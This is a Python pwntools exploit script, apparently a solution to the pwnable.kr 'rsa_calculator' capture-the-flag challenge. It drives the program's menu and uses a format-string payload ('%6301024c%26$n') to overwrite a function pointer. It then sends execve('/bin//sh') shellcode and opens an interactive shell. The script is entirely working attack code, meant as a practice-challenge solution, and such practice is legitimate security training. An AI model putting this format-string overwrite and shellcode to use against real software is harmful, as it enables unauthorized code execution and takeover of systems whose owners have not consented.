from pwn import *

context.log_level = 'DEBUG'

def set_key(P, q, e, d):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'p : ', str(P).encode())
    p.sendlineafter(b'q : ', str(q).encode())
    p.sendlineafter(b'e : ', str(e).encode())
    p.sendlineafter(b'd : ', str(d).encode())

def encrypt(payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', b'1024')
    p.sendlineafter(b'data\n', payload)

def decrypt(payload):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', b'1024')
    p.sendlineafter(b'data\n', payload)

p = process('./rsa_calculator')
# p = remote('pwnable.kr', 9012)
pause()

g_pbuf = 0x602560
help_addr = 0x602518

set_key('10000', '10000', '1', '1')

payload = b'%6301024c%26$n'
encrypt(payload)
p.recvuntil(b'-\n')

payload = p.recvline()[:-1] + p64(help_addr)
decrypt(payload)

shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
encrypt(shellcode)

p.sendlineafter(b'> ', b'4')
p.interactive()